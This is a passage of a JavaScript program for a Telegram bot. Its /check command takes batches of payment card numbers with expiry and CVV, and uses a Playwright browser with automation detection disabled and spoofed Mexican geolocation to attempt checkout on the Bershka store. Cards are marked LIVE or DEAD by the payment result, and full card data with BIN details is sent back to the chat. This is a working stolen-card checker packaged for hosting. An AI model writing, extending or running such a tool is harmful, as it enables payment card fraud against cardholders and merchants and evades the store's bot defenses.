          text.includes('pago rechazado') ||
          text.includes('no se ha podido') ||
          text.includes('la fecha no es válida') ||
          text.includes('fecha no válida') ||
          text.includes('tarjeta inválida') ||
          text.includes('cvv incorrecto')
        );
      }, { timeout: TIEMPO_ESPERA_MS }).then(async () => {
        const btnCerrarError = page.locator(
          'button:has-text("Cerrar"), button:has-text("CERRAR"), [data-qa-anchor*="close"], .bds-modal__close'
        ).last();
        if (await btnCerrarError.isVisible().catch(() => false)) {
          await btnCerrarError.click({ timeout: 3000 }).catch(() => {});
        }
        return 'DEAD';
      }).catch(() => null),

      page.waitForURL(/confirmation|success|pedido-confirmado|summary/i, {
        timeout: TIEMPO_ESPERA_MS
      }).then(() => 'LIVE').catch(() => null),

      page.waitForTimeout(TIEMPO_ESPERA_MS).then(() => {
        const url = page.url();
        if (/confirmation|success|pedido-confirmado/i.test(url)) {
          return 'LIVE';
        }
        return 'DEAD';
      })
    ]);

    return resultadoPago || 'DEAD';

  } catch (error) {
    logDiagnostico('RUN_NAVIGATION_ERROR');
    return 'DEAD';
  } finally {
    try {
      await page.evaluate(() => {
        const inputs = document.querySelectorAll('input');
        inputs.forEach(input => {
          if (/card|num|exp|cvv|cvc|holder|titular/i.test(input.name || input.id || input.placeholder || '')) {
            input.value = '';
            input.dispatchEvent(new Event('input', { bubbles: true }));
          }
        });
      }).catch(() => {});
    } catch (_) {}

    await context.close().catch(() => logDiagnostico('CONTEXT_CLOSE_ERROR'));
    
    // Pausa de 2 a 3 segundos entre cada tarjeta para no saturar procesos
    await page.waitForTimeout(2500).catch(() => {});
  }
}

// --- BOT TELEGRAM ---
function crearBotTelegram(token) {
  const ipv4Agent = new https.Agent({ family: 4, keepAlive: true, timeout: 30000 });
  const bot = new Telegraf(token, { handlerTimeout: Infinity, telegram: { agent: ipv4Agent } });

  bot.catch((err, ctx) => {
    logDiagnostico('TELEGRAF_BOT_ERROR');
    console.error('Error en Telegraf bot:', err);
    try {
      ctx.reply('❌ Ocurrió un error técnico al procesar el comando. Intente nuevamente.').catch(() => {});
    } catch (_) {}
  });

  const allowed = new Set((process.env.ALLOWED_USERS || '').split(',').map(s => s.trim()).filter(Boolean));
  const permitted = ctx => !allowed.size || allowed.has(String(ctx.from?.id));
  let browserBusy = false;

  bot.start(ctx => ctx.reply('Bot activo. Usa /recorrido para iniciar automatización o /check para verificar tarjetas.'));

  bot.command('check', async ctx => {
    if (!permitted(ctx)) return ctx.reply('No autorizado.');
    if (browserBusy) return ctx.reply('Tarea en proceso, espera que finalice la sesión activa.');

    const rawEntries = (ctx.message?.text || '').replace(/^\/check(?:@\w+)?\b/i, '').trim().split(/\s+/).filter(Boolean);
    if (!rawEntries.length) return ctx.reply('Uso: /check 16DÍGITOS|MM|AA|CVV o /check 16DÍGITOS|MM|AAAA|CVV');

    const tarjetasValidas = [];

    for (const entry of rawEntries) {
      const parsed = parsearDatosTarjeta(entry);
      if (parsed.valido) {
        tarjetasValidas.push(parsed);
      }
    }

    if (!tarjetasValidas.length) {
      return ctx.reply('❌ No se encontraron tarjetas válidas. Formato compatible: `16DÍGITOS|MM|AA|CVV` o `16DÍGITOS|MM|AAAA|CVV`.');
    }

    browserBusy = true;
    await ctx.reply(`🔍 Se encontraron ${tarjetasValidas.length} tarjetas válidas para procesar en lotes de 5.`);

    const LOTE_SIZE = 5;
    const launchArgs = ['--start-maximized', '--disable-blink-features=AutomationControlled'];
    const launchOptions = {
      headless: CONFIG.headless,
      args: launchArgs
    };

    try {
      for (let i = 0; i < tarjetasValidas.length; i += LOTE_SIZE) {
        const lote = tarjetasValidas.slice(i, i + LOTE_SIZE);
        await ctx.reply(`📦 Iniciando lote ${Math.floor(i / LOTE_SIZE) + 1} (${lote.length} tarjetas)...`);

        let browser;
        try {
          browser = await chromium.launch(launchOptions);
        } catch (_) {
          browser = await chromium.launch(launchOptions);
        }

        try {
          for (const tarjeta of lote) {
            let resultado = 'DEAD';
            try {
              resultado = await runNavigation(browser, tarjeta);
            } catch (err) {
              logDiagnostico('RUN_NAVIGATION_EXCEPTION');
              console.error('Error atrapado en tarjeta:', err.message);
              resultado = 'DEAD';
            }

            const lineaCompleta = `${tarjeta.numero}|${tarjeta.mes}|${tarjeta.anioCompleto || ('20' + tarjeta.anio)}|${tarjeta.cvv}`;
            let mensajeTelegram = '';

            if (resultado === 'LIVE') {
              const binInfo = await consultarBin(tarjeta.numero.slice(0, 6));
              mensajeTelegram =
                'Resultado Tarjeta\n' +
                `${lineaCompleta}\n` +
                '- Estado:✅ LIVE\n' +
                `${binInfo}`;
            } else {
              mensajeTelegram = `❌ X — ${lineaCompleta}`;
            }

            await ctx.telegram.sendMessage(ctx.chat.id, mensajeTelegram).catch(() => {
              logDiagnostico('TELEGRAM_SEND_MESSAGE_ERROR');
            });
          }
        } finally {
          if (browser) {
            await browser.close().catch(() => logDiagnostico('BROWSER_CLOSE_ERROR'));
          }
        }
      }
      await ctx.reply('✨ Procesamiento de todos los lotes finalizado.').catch(() => {});
    } catch (error) {
      logDiagnostico('LOTE_PROCESSING_ERROR');
      console.error('Detalle error lote:', error);
      await ctx.reply(`❌ Error en el procesamiento por lotes: ${error.message}`).catch(() => {});
    } finally {
      browserBusy = false;
    }
  });

  bot.command('recorrido', async ctx => {
    if (!permitted(ctx)) return ctx.reply('No autorizado.');
    if (browserBusy) return ctx.reply('Tarea en proceso, espera que finalice la sesión activa.');
    
    browserBusy = true;
    let browser;
    try {
      await ctx.reply('🚀 Iniciando recorrido automatizado en tienda...');
      const launchArgs = ['--start-maximized', '--disable-blink-features=AutomationControlled'];
      const launchOptions = {
        headless: CONFIG.headless,
        args: launchArgs
      };

      try {
        browser = await chromium.launch(launchOptions);
      } catch (_) {
        browser = await chromium.launch(launchOptions);
      }

      const steps = [];
      const ubicacion = elegirUbicacionAleatoriaMexico();
      steps.push(`📍 ${ubicacion.nombre}`);
      const context = await browser.newContext({
        timezoneId: 'America/Mexico_City',
        locale: 'es-MX',
        viewport: null,
        geolocation: { latitude: ubicacion.latitude, longitude: ubicacion.longitude, accuracy: ubicacion.accuracy },
        permissions: ['geolocation']
      });
      await context.grantPermissions(['geolocation'], { origin: 'https://www.bershka.com' }).catch(() => {});
      const page = await context.newPage();
      page.setDefaultTimeout(CONFIG.timeout);

      await page.goto(productUrl(), { waitUntil: 'domcontentloaded', timeout: 90000 });
      await page.waitForTimeout(5550);
      await cerrarBannerCookies(page);
      await waitForHydrationAndVisuals(page);
      const size = await selectAvailableSize(page);
      steps.push(`Talla ${size}`);
      await addToCartAndProceedToCheckout(page, steps, ubicacion);
      
      await ctx.reply('✅ Completado:\n' + steps.join(' ➔ '));
    } catch (error) {
      logDiagnostico('RECORRIDO_COMMAND_ERROR');
      console.error('Error en el recorrido:', error);
      await ctx.reply(`❌ Error en el recorrido: ${error.message}`).catch(() => {});
    } finally {
      if (browser) {
        await browser.close().catch(() => logDiagnostico('BROWSER_CLOSE_ERROR'));
      }
      browserBusy = false;
    }
  });

  bot.telegram.setMyCommands([
    { command: 'start', description: 'Iniciar el bot' },
    { command: 'check', description: 'Verificar tarjetas' },
    { command: 'recorrido', description: 'Recorrido de prueba' }
  ]).catch(() => {});

  return bot;
}

// --- DESPACHADOR PRINCIPAL (INDEX AUTOMATIZADO) CON SERVIDOR HTTP PARA RENDER ---
async function main() {
  const PORT = process.env.PORT || 3000;

  // 🌐 Servidor HTTP enlazado a '0.0.0.0' para que Render detecte el puerto abierto y no dé timeout
  http.createServer((req, res) => {
    res.writeHead(200, { 'Content-Type': 'text/plain' });
    res.end('Bot de Telegram activo y funcionando correctamente.');
  }).listen(parseInt(PORT, 10), '0.0.0.0', () => {
    console.log(`[HTTP] Servidor web escuchando en 0.0.0.0:${PORT}`);
  });

  console.log('[Runner] Iniciando en modo Daemon Telegram...');
  const bot = crearBotTelegram(process.env.BOT_TOKEN);
  await bot.launch({ dropPendingUpdates: true });
  console.log('[Runner] Bot conectado y escuchando comandos.');

  process.once('SIGINT', () => bot.stop('SIGINT'));
  process.once('SIGTERM', () => bot.stop('SIGTERM'));
}

if (require.main === module) {
  main();
}

module.exports = {
  consultarBin,
  runNavigation,
  elegirUbicacionAleatoriaMexico,
  CIUDADES_MEXICO,
  parsearDatosTarjeta,
  autocompletar_datos
};
